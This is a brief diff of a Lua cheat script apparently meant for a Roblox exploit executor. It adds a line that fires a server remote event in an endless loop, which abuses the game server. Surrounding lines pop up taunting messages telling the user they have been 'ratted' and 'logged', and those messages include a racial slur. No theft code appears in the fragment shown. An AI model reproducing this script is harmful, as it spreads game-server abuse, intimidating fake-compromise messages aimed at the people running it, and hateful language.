@@ -48,6 +48,7 @@ pcall(function()
 end)
 while true  do
     task.wait()
+    game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
 rconsolename("YOU GOT RATTED")
 rconsoleprint("GET LOGGED NIGAAAAAAA LOOOOL")
 messagebox("GET LOGGED NIGGA LOOOOL", "U GOT LOGGED NIGGA LOSER", 0)
